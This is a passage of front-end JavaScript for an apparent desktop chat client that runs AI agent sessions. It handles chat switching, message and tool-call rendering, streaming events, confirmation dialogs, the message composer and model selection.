  if (!hist?.messages) await live(key); // too large to read directly: let Pi load it
  scrollBottom(true);
}

// New chat never interrupts anything: the current chat keeps running in the background.
async function newChat() {
  const cur = P();
  if (!cur.msgs.length && !cur.streaming) { renderAll(); $("#input").focus(); live(cur.key); return; }
  const key = newChatState(S.active);
  S.activeChat[S.active] = key;
  showChat();
  $("#input").focus();
  await live(key);
}

// Jump to any chat (any character), e.g. from the activity strip.
async function openChatKey(key) {
  const p = S.per[key]; if (!p) return;
  S.activeChat[p.harness] = key;
  if (p.harness !== S.active) await selectCharacter(p.harness); else activateChat(key);
}

// Close Pi processes that are idle and out of sight: after 3 minutes away, and never more than 2 kept warm.
// (A heavy harness can be hundreds of MB per chat, so idle ones don't pile up.)
// The chat stays in the list with its history; using it again starts a fresh process on that session file.
function reapChats() {
  const idle = Object.values(S.per).filter((c) => c.started && !c.streaming && c.key !== CK() && !dialogQueue.some((d) => d.id === c.key))
    .sort((a, b) => a.lastUsed - b.lastUsed);
  const now = Date.now();
  idle.forEach(async (c, i) => {
    if (now - c.lastUsed > 3 * 60e3 || idle.length - i > 2) {
      // The app may know better than the window: a chat can be working (or waiting on a background job) while it looks idle here.
      const r = await desk.closeChat(c.key, { reap: true });
      if (r?.kept) { c.lastUsed = Date.now(); return; }
      c.started = false; c.livePromise = null;
      if (!c.sessionFile || !c.msgs.length) { delete S.per[c.key]; if (S.activeChat[c.harness] === c.key) delete S.activeChat[c.harness]; }
    }
  });
}

// ---------- rendering ----------
function renderAll() { renderCrumb(); renderHero(); renderThread(); renderDock(); renderThreads(); }

function renderCrumb() {
  const ch = C(), p = P();
  const title = p.sessionName || TH().find((t) => t.file === p.sessionFile)?.title || (p.msgs.length ? textOf(p.msgs.find((m) => m.role === "user")?.content).slice(0, 80) : "");
  $("#crumb").replaceChildren(avatar(ch, 26, 8, { blink: true }), h("span", { class: "cname" }, ch.name),
    title ? h("span", { class: "sep" }, "/") : h("span", { class: "ttl" }, ch.tagline || ""), title ? h("span", { class: "ttl" }, title) : null);
  $("#panelToggle").classList.toggle("on", S.panelOpen);
}

function randomQuote(ch) {
  const qs = ch.quoteList || [];
  return qs.length ? qs[Math.floor(Math.random() * qs.length)] : null;
}
function renderHero() {
  const ch = C(), q = randomQuote(ch);
  const greet = (ch.greeting || `Hi ${S.user}. What are we working on?`).replace("{user}", S.user);
  $("#hero").replaceChildren(
    h("div", { class: "hero-av" }, avatar(ch, 112, 28, { blink: true })),
    h("div", { class: "nametag" }, h("b", {}, ch.name), ch.tagline ? " · " + ch.tagline : ""),
    h("h1", {}, greet),
    q ? h("div", { class: "quote" }, `“${q.q}”`, h("small", {}, q.src || q.by || "")) : null,
    h("div", { class: "chips" }, (ch.suggestions || []).map((s) => h("button", { "data-fast": true, class: "chip", onclick: () => { $("#input").value = s.prompt; send(); } }, s.label))),
  );
  $("#main").classList.toggle("is-empty", !P().msgs.length);
}

function isNearBottom() { const s = $("#scroller"); return s.scrollHeight - s.scrollTop - s.clientHeight < 140; }
function scrollBottom(force) { const s = $("#scroller"); if (force || S.stick) s.scrollTop = s.scrollHeight; }
$("#scroller").addEventListener("scroll", () => { S.stick = isNearBottom(); });

// Split messages into turns: a user message, then everything until the next user message.
function turns(msgs) {
  const out = []; let cur = null;
  for (const m of msgs) {
    if (m.role === "user") { out.push({ user: m }); cur = { items: [] }; out.push(cur); continue; }
    if (m.role === "system" || m.role === "toolResult") continue;
    if (!cur) { cur = { items: [] }; out.push(cur); }
    cur.items.push(m);
  }
  return out;
}

// Long chats render only the latest part (older messages one click away), so opening them stays instant.
const TAIL = 60;
function visibleTurns(p) {
  const all = turns(p.msgs);
  const hidden = S.showAll.has(p.key) ? 0 : Math.max(0, all.length - TAIL);
  return { all, hidden, list: hidden ? all.slice(hidden) : all };
}
function renderThread() {
  const el = $("#thread"), p = P();
  $("#main").classList.toggle("is-empty", !p.msgs.length);
  const { all, hidden, list } = visibleTurns(p);
  let ui = all.slice(0, hidden).filter((t) => t.user).length; // user index among ALL messages (edit/regenerate rely on it)
  const nodes = list.map((t, i) => {
    const idx = hidden + i;
    const n = t.user ? userNode(t.user, ui++) : turnNode(t, idx === all.length - 1);
    n.dataset.t = String(idx);
    return n;
  });
  if (hidden) nodes.unshift(h("button", { class: "show-earlier", onclick: () => { S.showAll.add(p.key); renderThread(); } }, `Show ${all.slice(0, hidden).filter((t) => t.user).length} earlier messages`));
  el.replaceChildren(...nodes);
  scrollBottom();
}
let raf = 0;
function scheduleRender() {
  if (raf) return;
  raf = requestAnimationFrame(() => {
    raf = 0;
    const el = $("#thread"), p = P();
    const { all } = visibleTurns(p);
    const last = all.length - 1;
    // Re-render only the trailing assistant turn; everything above is settled.
    if (last >= 0 && !all[last].user && el.lastElementChild?.dataset.t === String(last)) {
      const n = turnNode(all[last], true); n.dataset.t = String(last);
      el.lastElementChild.replaceWith(n);
    } else renderThread();
    $("#main").classList.toggle("is-empty", !p.msgs.length);
    scrollBottom();
  });
}

const ACT = {
  copy: '<rect x="7" y="7" width="10" height="10" rx="2"/><path d="M13 7V5a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2h2"/>',
  edit: '<path d="M4 16h3l8.5-8.5a2.1 2.1 0 0 0-3-3L4 13v3z"/>',
  redo: '<path d="M15 5v4h-4"/><path d="M15 9a6 6 0 1 0 1 5"/>',
};
const actBtn = (icon, title, fn) => h("button", { class: "act-btn", title, onclick: (e) => { e.stopPropagation(); fn(e.currentTarget); } }, svg(icon));
function copyText(text, btn) { navigator.clipboard.writeText(text); if (btn) { btn.classList.add("done"); setTimeout(() => btn.classList.remove("done"), 1200); } }
function userNode(m, index) {
  const imgs = Array.isArray(m.content) ? m.content.filter((b) => b.type === "image") : [];
  const text = textOf(m.content);
  if (S.editing === index) {
    const ta = h("textarea", { class: "edit-box", rows: 3 }); ta.value = text;
    const go = () => { const v = ta.value.trim(); S.editing = null; if (v) resendFrom(index, v); else renderThread(); };
    ta.addEventListener("keydown", (e) => { if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); go(); } if (e.key === "Escape") { S.editing = null; renderThread(); } });
    setTimeout(() => { ta.focus(); ta.style.height = ta.scrollHeight + "px"; }, 0);
    return h("div", { class: "user editing" }, h("div", { class: "edit-wrap" }, ta,
      h("div", { class: "row" }, h("span", { class: "hint" }, "Sends from here as a new branch; the original chat is kept."),
        h("button", { class: "btn", onclick: () => { S.editing = null; renderThread(); } }, "Cancel"), h("button", { class: "btn primary", onclick: go }, "Send"))));
  }
  return h("div", { class: "user" }, h("div", { class: "user-col" },
    imgs.length ? h("div", { class: "imgs" }, imgs.map((b) => h("img", { src: `data:${b.mimeType};base64,${b.data}` }))) : null,
    h("div", { class: "bubble" + (m.pending ? " pending" : "") }, text),
    m.pending ? null : h("div", { class: "msg-acts" }, actBtn(ACT.copy, "Copy", (b) => copyText(text, b)),
      P().streaming ? null : actBtn(ACT.edit, "Edit", () => { S.editing = index; renderThread(); }))));
}

function turnNode(t, isLast) {
  const ch = C(), p = P();
  const box = h("div", { class: "turn" });
  if (t.items.some((m) => m.role === "assistant")) box.append(h("div", { class: "who" }, avatar(ch, 22, 6, { blink: isLast }), ch.name));
  t.items.forEach((m, mi) => {
    if (m.role === "assistant") {
      (m.content || []).forEach((b, bi) => {
        const key = `${m.timestamp || mi}:${bi}`;
        if (b.type === "text" && b.text) {
          const node = md(b.text);
          if (isLast && p.streaming && m._live && bi === m.content.length - 1) node.lastElementChild?.classList.add("cursor");
          box.append(node);
        } else if (b.type === "thinking" && (b.thinking || "").trim() && S.cfg?.showThinking !== false) box.append(thinkNode(b, key, m._live && bi === m.content.length - 1));
        else if (b.type === "toolCall") box.append(toolNode(b));
      });
      if (m.stopReason === "error" && m.errorMessage) box.append(h("div", { class: "err", title: m.errorMessage }, friendlyError(m.errorMessage)));
      if (m.stopReason === "aborted") box.append(h("div", { class: "divider" }, "Stopped"));
    } else if (m.role === "custom" && m.display) box.append(h("div", { class: "note" }, md(textOf(m.content))));
    else if (m.role === "compactionSummary") box.append(h("div", { class: "divider" }, "Context compacted"));
    else if (m.role === "branchSummary") box.append(h("div", { class: "divider" }, "Branch summary"));
    else if (m.role === "bashExecution") box.append(toolNode({ id: "bx" + m.timestamp, name: "bash", arguments: { command: m.command } }, { content: [{ type: "text", text: m.output }], isError: m.exitCode !== 0 }));
  });
  const replyText = t.items.filter((m) => m.role === "assistant").map((m) => (m.content || []).filter((b) => b.type === "text").map((b) => b.text).join("\n\n")).filter(Boolean).join("\n\n");
  if (replyText && !(isLast && p.streaming)) {
    box.append(h("div", { class: "msg-acts left" }, actBtn(ACT.copy, "Copy reply", (b) => copyText(replyText, b)),
      isLast ? actBtn(ACT.redo, "Regenerate", () => regenerate()) : null));
  }
  return box;
}

function fold(cls, key, head, body) {
  const el = h("div", { class: cls + (S.openFolds.has(key) ? " open" : "") });
  const btn = h("button", { class: "fold-head", onclick: () => { el.classList.toggle("open"); el.classList.contains("open") ? S.openFolds.add(key) : S.openFolds.delete(key); } }, ...head, svg(ICON.chev));
  el.append(btn, h("div", { class: "fold-body" }, body));
  return el;
}

function thinkNode(b, key, live) {
  const first = (b.thinking || "").trim().split("\n")[0].replace(/^\*\*|\*\*$/g, "").slice(0, 90);
  return fold("think" + (live ? " live" : ""), "t" + key, [svg(ICON.brain), h("span", { class: "verb" }, live ? "Thinking" : "Thought"), h("code", { style: "font-family:inherit;color:var(--faint)" }, first)], b.thinking);
}

const rel = (f) => { const cwd = C()?.cwd || ""; f = String(f || ""); return f.startsWith(cwd + "/") ? f.slice(cwd.length + 1) : f.replace(S.home, "~"); };
function toolSummary(name, a = {}) {
  const first = (s) => String(s || "").split("\n")[0];
  switch (name) {
    case "bash": return [ICON.term, "Ran", first(a.command)];
    case "read": return [ICON.file, "Read", rel(a.path)];
    case "write": return [ICON.pen, "Wrote", rel(a.path)];
    case "edit": return [ICON.pen, "Edited", rel(a.path)];
    case "grep": case "find": case "ls": return [ICON.search, name === "ls" ? "Listed" : "Searched", a.pattern || a.path || ""];
    case "ask_user_question": return [ICON.ask, "Asked you", (a.questions || []).map((q) => q.header || q.question).join(" · ")];
    default: {
      const v = Object.values(a).find((x) => typeof x === "string");
      return [/web|fetch|search/.test(name) ? ICON.globe : ICON.spark, name.replace(/_/g, " "), first(v).slice(0, 120)];
    }
  }
}
function toolNode(b, resultOverride) {
  const r = resultOverride || P().results[b.id];
  const args = b.arguments || {};
  const [icon, verb, detail] = toolSummary(b.name, args);
  const running = !r || r.running;
  const body = h("div");
  if (b.name === "edit" && Array.isArray(args.edits)) {
    for (const e of args.edits.slice(0, 6)) {
      const d = h("div", { class: "diff" });
      String(e.oldText || "").split("\n").slice(0, 30).forEach((l) => d.append(h("div", { class: "del" }, "- " + l)));
      String(e.newText || "").split("\n").slice(0, 30).forEach((l) => d.append(h("div", { class: "add" }, "+ " + l)));
      body.append(d);
    }
  } else if (b.name === "write" && args.content) {
    body.append(h("pre", {}, String(args.content).slice(0, 4000)));
  } else if (b.name === "bash") body.append(h("pre", { style: "margin-bottom:6px;color:var(--muted)" }, "$ " + (args.command || "")));
  if (r) {
    const content = r.content || r.partialResult?.content || [];
    const txt = strip(textOf(content));
    if (txt && b.name !== "write") body.append(h("pre", {}, txt.length > 6000 ? txt.slice(0, 6000) + "\n…" : txt));
    for (const im of content.filter((c) => c.type === "image")) body.append(h("img", { src: `data:${im.mimeType};base64,${im.data}` }));
  }
  const head = [svg(icon), h("span", { class: "verb" }, verb), detail ? h("code", {}, detail) : null];
  if (r?.durationMs) head.push(h("span", { class: "dur" }, (r.durationMs / 1000).toFixed(1) + "s"));
  if ((b.name === "write" || b.name === "edit") && args.path) {
    head.push(h("span", { class: "act", onclick: (e) => { e.stopPropagation(); openFile(args.path); } }, "Open"));
  }
  return fold(`tool${running ? " running" : ""}${r?.isError ? " error" : ""}`, "x" + b.id, head, body);
}

// ---------- dock: composer, pills, working line ----------
function renderDock() {
  const p = P(), ch = C();
  const send = $("#sendBtn");
  send.classList.toggle("stop", p.streaming && !$("#input").value.trim());
  send.disabled = !p.streaming && !$("#input").value.trim() && !p.attachments.length;
  const m = p.model || S.info[p.harness]?.model;
  const isDefault = m && p.defaultModel && m.provider === p.defaultModel.provider && m.id === p.defaultModel.id;
  $("#modelPill").replaceChildren(m ? (m.name || m.id) : p.started ? "Starting…" : "Choose model", m && isDefault ? h("span", { class: "tag" }, "default") : null);
  $("#thinkPill").textContent = p.thinking ? `Thinking: ${p.thinking}` : "";
  $("#thinkPill").hidden = !p.thinking || !(m?.reasoning);
  renderCtx();
  // working line
  const w = $("#working");
  w.hidden = !p.streaming;
  if (p.streaming && !w.firstChild) {
    w.append(h("span", { class: "spin" }), h("span", { class: "word" }, `${ch.name} is ${(ch.workingWord || "working").toLowerCase()}…`), h("span", { class: "q" }), h("span", { class: "t" }));
    tickWorking(true);
  }
  if (!p.streaming) w.replaceChildren();
  // queue + widgets + statuses
  const q = [...p.queue.steering, ...p.queue.followUp];
  $("#queue").hidden = !q.length;
  $("#queue").replaceChildren(h("span", {}, "Queued:"), ...q.map((t) => h("span", { class: "qi" }, t.slice(0, 60))));
  const wl = Object.values(p.widgets).flat().map(strip).filter((l) => l.trim());
  $("#widgets").hidden = !wl.length; $("#widgets").textContent = wl.join("\n");
  $("#statusline").replaceChildren(...Object.values(p.statuses).map(strip).filter(Boolean).map((s) => h("span", {}, s)));
  $("#attachments").hidden = !p.attachments.length;
  $("#attachments").replaceChildren(...p.attachments.map((a, i) => h("div", { class: "att" }, h("img", { src: `data:${a.mimeType};base64,${a.data}` }), h("button", { onclick: () => { p.attachments.splice(i, 1); renderDock(); } }, "×"))));
}
const SPIN = ["◜", "◠", "◝", "◞", "◡", "◟"];
let workTimer = 0, quoteAt = 0, spinI = 0;
function tickWorking(reset) {
  clearInterval(workTimer);
  if (reset) quoteAt = 0;
  const step = () => {
    const p = P(), w = $("#working");
    if (!p.streaming || w.hidden) return clearInterval(workTimer);
    w.querySelector(".spin").textContent = SPIN[spinI++ % SPIN.length];
    const secs = Math.floor((Date.now() - p.startedAt) / 1000);
    w.querySelector(".t").textContent = `${secs >= 60 ? Math.floor(secs / 60) + "m " : ""}${secs % 60}s · esc to stop`;
    if (Date.now() - quoteAt > 9000) {
      quoteAt = Date.now();
      const q = randomQuote(C());
      const el = w.querySelector(".q");
      el.style.opacity = 0;
      setTimeout(() => { el.textContent = q ? `“${q.q}”` : ""; el.style.opacity = 1; }, 300);
    }
  };
  step(); workTimer = setInterval(step, 120);
}
async function updateCtx(id = CK()) {
  if (!S.per[id]?.started) return;
  const r = await desk.cmd(id, { type: "get_session_stats" });
  if (r.success && S.per[id]) { S.per[id].ctx = r.data.contextUsage; if (id === CK()) renderCtx(); }
}
function renderCtx() {
  const c = P().ctx, el = $("#ctxMeter");
  if (!c || !c.tokens || !c.contextWindow) return el.replaceChildren();
  const pct = Math.min(1, c.tokens / c.contextWindow);
  if (pct < 0.01) return el.replaceChildren();
  el.replaceChildren(svg(ICON.ring(pct)), `${Math.round(pct * 100)}%`);
  el.title = `${c.tokens.toLocaleString()} / ${c.contextWindow.toLocaleString()} tokens`;
}

// Turns the provider's raw error into what happened and what to do. The original text stays in the tooltip.
function friendlyError(raw) {
  const e = String(raw);
  if (/subscription is required|subscription_sharing|Go models/i.test(e)) return "This model's subscription isn't active, so it can't answer. Renew it, or switch this chat to another model with the model picker. " + "Nothing was lost; send your message again after switching.";
  if (/session limit|five_hour|rate limit/i.test(e) && /resets/i.test(e)) { const at = e.match(/resets\s+(\d{1,2}(?::\d{2})?\s?[ap]m)/i)?.[1]; return `This model's usage limit is reached${at ? `; it resets at ${at}` : ""}. Switch to another model to keep going, or wait.`; }
  if (/no space left|ENOSPC/i.test(e)) return "Your Mac's disk is full, so this chat couldn't save its work. Free some space, then send your message again.";
  if (/EPROTO|ENOTFOUND|ECONNREFUSED|ECONNRESET|ETIMEDOUT|Unable to connect|Can't reach the API|No response from API|network dropped/i.test(e)) return "The connection dropped and the automatic retries ran out. Check your internet, then send \"continue\" to pick up where it stopped.";
  if (/prompt is too long|context.*(overflow|length|exceed)/i.test(e)) return "This chat has grown too long for the model. Start a new chat, or compact it first (/compact).";
  return e;
}

// ---------- streaming events ----------
function liveAssistant(p) { const m = p.msgs[p.msgs.length - 1]; return m && m.role === "assistant" && m._live ? m : null; }
function onEvent(id, ev) {
  const p = S.per[id], active = id === CK();
  switch (ev.type) {
    case "agent_start":
      if (!p.streaming) p.startedAt = Date.now();
      p.streaming = true; renderChars(); if (active) renderDock(); break;
    case "agent_settled":
      p.streaming = false;
      if (!active || !document.hasFocus()) p.unread = true;
      p.lastUsed = Date.now();
      renderChars(); if (active) { renderDock(); scheduleRender(); } else if (p.harness === S.active) renderThreads();
      syncState(id); refreshThreads(p.harness); updateCtx(id);
      if (C(p.harness)?.panel === "learning") refreshTopics();
      break;
    case "message_start":
      if (ev.message.role === "assistant") p.msgs.push({ ...ev.message, content: [], _live: true });
      break;
    case "message_update": {
      const m = liveAssistant(p), e = ev.assistantMessageEvent; if (!m || !e) break;
      const i = e.contentIndex;
      if (e.type === "text_start") m.content[i] = { type: "text", text: "" };
      else if (e.type === "text_delta") (m.content[i] ||= { type: "text", text: "" }).text += e.delta;
      else if (e.type === "text_end") m.content[i] = { type: "text", text: e.content ?? m.content[i]?.text };
      else if (e.type === "thinking_start") m.content[i] = { type: "thinking", thinking: "" };
      else if (e.type === "thinking_delta") (m.content[i] ||= { type: "thinking", thinking: "" }).thinking += e.delta;
      else if (e.type === "thinking_end") m.content[i] = { type: "thinking", thinking: e.content ?? m.content[i]?.thinking };
      else if (e.type === "toolcall_start") m.content[i] = { type: "toolCall", id: e.id, name: e.toolName, arguments: {} };
      else if (e.type === "toolcall_end") m.content[i] = e.toolCall;
      for (let k = 0; k < m.content.length; k++) m.content[k] ||= { type: "text", text: "" };
      if (active) scheduleRender();
      break;
    }
    case "message_end": {
      const m = ev.message;
      if (m.role === "assistant") {
        const live = liveAssistant(p);
        if (live) p.msgs[p.msgs.length - 1] = m; else p.msgs.push(m);
      } else if (m.role === "user") {
        const pend = p.msgs.findIndex((x) => x.pending);
        if (pend >= 0) p.msgs[pend] = m; else p.msgs.push(m);
      } else if (m.role === "toolResult") p.results[m.toolCallId] = m;
      else if (m.role !== "system") p.msgs.push(m);
      if (active) scheduleRender();
      break;
    }
    case "tool_execution_start": p.results[ev.toolCallId] = { running: true, content: [] }; if (active) scheduleRender(); break;
    case "tool_execution_update": p.results[ev.toolCallId] = { running: true, content: ev.partialResult?.content || [] }; if (active) scheduleRender(); break;
    case "tool_execution_end": p.results[ev.toolCallId] = { ...ev.result, isError: ev.isError, durationMs: ev.durationMs }; if (active) scheduleRender(); break;
    case "queue_update": p.queue = { steering: ev.steering || [], followUp: ev.followUp || [] }; if (active) renderDock(); break;
    case "session_info_changed": p.sessionName = ev.name || ""; if (active) renderCrumb(); refreshThreads(p.harness); break;
    case "thinking_level_changed": p.thinking = ev.level; if (active) renderDock(); break;
    case "compaction_start": if (active) toast("Compacting context…"); break;
    case "extension_error": console.warn("extension_error", ev); break;
    case "extension_ui_request": onUiRequest(id, ev); break;
  }
}

// ---------- extension UI (dialogs from Pi: ask_user_question, confirms, etc.) ----------
const dialogQueue = [];
function onUiRequest(id, ev) {
  const p = S.per[id]; if (!p) return;
  switch (ev.method) {
    case "notify": return toast(strip(ev.message), ev.notifyType);
    case "setStatus": if (ev.statusText) p.statuses[ev.statusKey] = ev.statusText; else delete p.statuses[ev.statusKey]; if (id === CK()) renderDock(); return;
    case "setWidget": if (ev.widgetLines?.length) p.widgets[ev.widgetKey] = ev.widgetLines; else delete p.widgets[ev.widgetKey]; if (id === CK()) renderDock(); return;
    case "set_editor_text": if (id === CK()) { $("#input").value = ev.text; autosize(); } return;
    case "setTitle": return;
    default: dialogQueue.push({ id, ev }); if (dialogQueue.length === 1) showDialog();
  }
}
function showDialog() {
  const next = dialogQueue[0];
  if (!next) return ($("#modal").hidden = true);
  const { id, ev } = next, ch = C(S.per[id]?.harness) || { id, name: "Pi", accent: "#888" };
  let timer;
  const done = (resp) => {
    clearTimeout(timer);
    if (dialogQueue[0] !== next) return; // already answered, timed out, or dropped
    desk.uiResponse(id, { type: "extension_ui_response", id: ev.id, ...resp });
    dialogQueue.shift(); showDialog();
  };
  const d = h("div", { class: "dialog" }, h("div", { class: "from" }, avatar(ch, 18, 5), `${ch.name} asks`));
  const title = strip(ev.title || "");
  if (ev.method === "select") {
    d.append(h("div", { class: "title" }, title));
    ev.options.forEach((o, i) => {
      const s = strip(o), m = s.match(/^\s*\d+\.\s*(.*?)(?:\s+—\s+(.*))?$/s);
      d.append(h("button", { class: "opt", onclick: () => done({ value: o }) }, h("span", { class: "n" }, i + 1),
        h("span", {}, h("div", { class: "l" }, m ? m[1] : s), m?.[2] ? h("div", { class: "ds" }, m[2]) : null)));
    });
    d.append(h("div", { class: "row" }, h("button", { class: "btn", onclick: () => done({ cancelled: true }) }, "Skip")));
  } else if (ev.method === "confirm") {
    d.append(h("div", { class: "title" }, title), h("div", { class: "md" }, strip(ev.message)),
      h("div", { class: "row" }, h("button", { class: "btn", onclick: () => done({ confirmed: false }) }, "No"), h("button", { class: "btn primary", onclick: () => done({ confirmed: true }) }, "Yes")));
  } else {
    const field = ev.method === "editor" ? h("textarea", { rows: 8 }) : h("input", { placeholder: ev.placeholder || "" });
    field.value = ev.prefill || "";
    field.addEventListener("keydown", (e) => { if (e.key === "Enter" && (ev.method !== "editor" || e.metaKey)) { e.preventDefault(); done({ value: field.value }); } });
    d.append(h("div", { class: "title" }, title), field,
      h("div", { class: "row" }, h("button", { class: "btn", onclick: () => done({ cancelled: true }) }, "Cancel"), h("button", { class: "btn primary", onclick: () => done({ value: field.value }) }, "Send")));
    setTimeout(() => field.focus(), 30);
  }
  if (ev.timeout) timer = setTimeout(() => done({ cancelled: true }), ev.timeout);
  $("#modal").replaceChildren(d); $("#modal").hidden = false;
  d._keys = (e) => { if (ev.method === "select" && /^[1-9]$/.test(e.key) && ev.options[e.key - 1]) done({ value: ev.options[e.key - 1] }); };
  S.dialogKeys = d._keys;
}
document.addEventListener("keydown", (e) => { if (!$("#modal").hidden && S.dialogKeys && document.activeElement.tagName !== "INPUT" && document.activeElement.tagName !== "TEXTAREA") S.dialogKeys(e); });

function toast(msg, type = "info", action) {
  const t = h("div", { class: `toast ${type}` }, msg,
    action ? h("button", { class: "toast-act", onclick: () => { t.remove(); action.fn(); } }, action.label) : null);
  $("#toasts").append(t);
  setTimeout(() => t.remove(), action ? 8000 : type === "error" ? 9000 : 4500);
}

// ---------- sending ----------
const input = $("#input");
function autosize() { input.style.height = "auto"; input.style.height = input.scrollHeight + "px"; renderDock(); }
// A real click in the composer warms the chat. (Not the focus event: macOS focuses the box by itself when the window opens.)
$("#composer").addEventListener("pointerdown", () => { const p = P(); if (!p.started && p.key !== "__boot") live(p.key); });
input.addEventListener("input", () => {
  autosize(); slashMenu();
  const p = P(); if (input.value && !p.started) live(p.key); // warm the process while you type so the reply starts at once
});

async function send() {
  let id = CK(); const p = P(id);
  p.lastUsed = Date.now();
  const text = input.value.trim();
  if (!text && !p.attachments.length) return;
  if (p.harness) { const b = p.harness.replace(/-fast$/, ""), u = (S.usage[b] ||= { n: 0, last: 0 }); u.n++; u.last = Date.now(); desk.bumpUsage(p.harness); }
  if (text === "/new") { input.value = ""; autosize(); return newChat(); }
  const images = p.attachments.slice();
  input.value = ""; p.attachments = []; autosize(); closeSlash();
  await live(id);
  id = p.key; // may have joined another chat's process for this file
  const content = images.length ? [{ type: "text", text }, ...images] : text;
  if (p.streaming) {
    const r = await desk.cmd(id, { type: "prompt", message: text, images, streamingBehavior: "steer" });
    if (!r.success) toast(r.error, "error");
    return;
  }
  const isCmd = text.startsWith("/");
  if (!isCmd) { p.msgs.push({ role: "user", content, pending: true, timestamp: Date.now() }); S.stick = true; renderThread(); }
  const r = await desk.cmd(id, { type: "prompt", message: text, images });
  if (!r.success) { toast(r.error, "error"); p.msgs = p.msgs.filter((m) => !m.pending); renderThread(); }
  else if (r.data?.disposition === "handled") { p.msgs = p.msgs.filter((m) => !m.pending); renderThread(); syncState(id); }
}
$("#sendBtn").addEventListener("click", () => (P().streaming && !input.value.trim() ? abort() : send()));
function abort() { desk.cmd(CK(), { type: "abort" }); }

input.addEventListener("keydown", (e) => {
  const menu = $("#slashMenu");
  if (!menu.hidden) {
    const items = [...menu.querySelectorAll(".mi")];
    let i = items.findIndex((x) => x.classList.contains("sel"));
    if (e.key === "ArrowDown" || e.key === "ArrowUp") { e.preventDefault(); items[i]?.classList.remove("sel"); i = (i + (e.key === "ArrowDown" ? 1 : -1) + items.length) % items.length; items[i].classList.add("sel"); items[i].scrollIntoView({ block: "nearest" }); return; }
    if ((e.key === "Tab" || e.key === "Enter") && items[i]) { e.preventDefault(); items[i].click(); return; }
    if (e.key === "Escape") { closeSlash(); return; }
  }
  if (e.key === "Enter" && !e.shiftKey && !e.isComposing) { e.preventDefault(); send(); }
  if (e.key === "Escape" && P().streaming) abort();
});
input.addEventListener("paste", (e) => {
  for (const it of e.clipboardData.items) {
    if (!it.type.startsWith("image/")) continue;
    e.preventDefault();
    const f = it.getAsFile(), rd = new FileReader();
    rd.onload = () => { P().attachments.push({ type: "image", mimeType: f.type, data: rd.result.split(",")[1] }); renderDock(); };
    rd.readAsDataURL(f);
  }
});

function slashMenu() {
  const v = input.value, menu = $("#slashMenu");
  if (!v.startsWith("/") || v.includes(" ") || v.includes("\n")) return closeSlash();
  const q = v.slice(1).toLowerCase();
  const all = [{ name: "new", description: "Start a new chat" }, ...(P().commands.length ? P().commands : S.info[S.active]?.commands || [])];
  const list = all.filter((c) => c.name.toLowerCase().includes(q)).slice(0, 40);
  if (!list.length) return closeSlash();
  menu.replaceChildren(...list.map((c, i) => h("button", { class: "mi" + (i === 0 ? " sel" : ""), onclick: () => { input.value = `/${c.name} `; closeSlash(); input.focus(); autosize(); } },
    h("span", { class: "k" }, "/" + c.name), h("span", { class: "d" }, c.description || c.source || ""))));
  menu.hidden = false;
}
function closeSlash() { $("#slashMenu").hidden = true; }

// ---------- model + thinking popovers ----------
// One popup at a time. Every way of closing it goes through closePopover(), which also removes the outside-click
// listener: a listener left behind by an earlier popup used to close the next one the instant it opened.
let popOutside = null, popKey = null, popOpenedAt = 0;
function closePopover() {
  const pop = $("#popover");
  pop.hidden = true; popKey = null;
  if (popOutside) { document.removeEventListener("pointerdown", popOutside, true); popOutside = null; }
}
function popover(anchor, build, { below = false, key = null, cls = "" } = {}) {
  const pop = $("#popover");
  if (key && !pop.hidden && popKey === key) return closePopover(); // clicking the button that opened it again closes it
  closePopover();
  pop.className = ("menu " + cls).trim(); pop.replaceChildren(); pop.style.maxHeight = ""; pop.style.top = ""; pop.style.bottom = "";
  build(pop);
  const r = anchor.getBoundingClientRect();
  pop.hidden = false; popKey = key; popOpenedAt = performance.now();
  pop.style.left = Math.max(8, Math.min(r.left, innerWidth - pop.offsetWidth - 12)) + "px";
  // Anchored by the edge next to the opener and capped to the room available, so it can never slide over its own opener
  // (which is what made the switcher hard to close and re-open).
  const cssMax = parseFloat(getComputedStyle(pop).maxHeight) || 1e9;
  if (below) { const top = r.bottom + 6; pop.style.top = top + "px"; pop.style.maxHeight = Math.min(cssMax, innerHeight - top - 12) + "px"; }
  else { pop.style.bottom = (innerHeight - r.top + 8) + "px"; pop.style.maxHeight = Math.min(cssMax, Math.max(160, r.top - 20)) + "px"; }
  // Listen from now on, but never for the press that opened it, nor for presses on its own opener.
  popOutside = (e) => {
    if (performance.now() - popOpenedAt < 350 || pop.contains(e.target)) return;
    if (key && e.target.closest?.(`[data-pop="${key}"]`)) return; // the opener handles its own toggle
    closePopover();
  };
  document.addEventListener("pointerdown", popOutside, true);
}
$("#modelPill").addEventListener("click", async (e) => {
  const id = CK(), p = P(id), anchor = e.currentTarget;
  await live(id);
  const r = await desk.cmd(id, { type: "get_available_models" });
  if (!r.success) return toast(r.error, "error");
  // config.modelProviders limits the picker to providers that work out of the box (plus the harness's own default); empty = all.
  const ok = new Set(S.providers.length ? [...S.providers, p.defaultModel?.provider].filter(Boolean) : []);
  const models = r.data.models.filter((m) => !ok.size || ok.has(m.provider));
  popover(anchor, (pop) => {
    const search = h("input", { placeholder: "Search models", spellcheck: "false" });
    const list = h("div");
    const pick = async (m) => {
      closePopover();
      const res = await desk.cmd(id, { type: "set_model", provider: m.provider, modelId: m.id });
      if (!res.success) return toast(res.error, "error");
      await syncState(id);
    };
    const draw = () => {
      const q = search.value.toLowerCase();
      list.replaceChildren();
      const d = p.defaultModel;
      if (d && !q) list.append(h("button", { class: "mi", onclick: () => pick({ provider: d.provider, id: d.id }) }, h("span", { class: "k" }, "Harness default"), h("span", { class: "d" }, `${d.provider}/${d.id}`)));
      let grp = "";
      for (const m of models.filter((m) => !q || `${m.provider}/${m.id} ${m.name}`.toLowerCase().includes(q)).sort((a, b) => a.provider.localeCompare(b.provider))) {
        if (m.provider !== grp) { grp = m.provider; list.append(h("div", { class: "grp" }, grp)); }
        const cur = p.model && p.model.provider === m.provider && p.model.id === m.id;
        list.append(h("button", { class: "mi", onclick: () => pick(m) }, h("span", { class: "k" }, m.name || m.id), h("span", { class: "d" }, m.id), cur ? h("span", { class: "chk" }, "✓") : null));
      }
    };
    search.addEventListener("input", draw);
    pop.append(search, list); draw();
    setTimeout(() => search.focus(), 0);
  });
});
$("#thinkPill").addEventListener("click", async (e) => {
  const id = CK(), p = P(id);
  await live(id);
  popover(e.currentTarget, (pop) => {
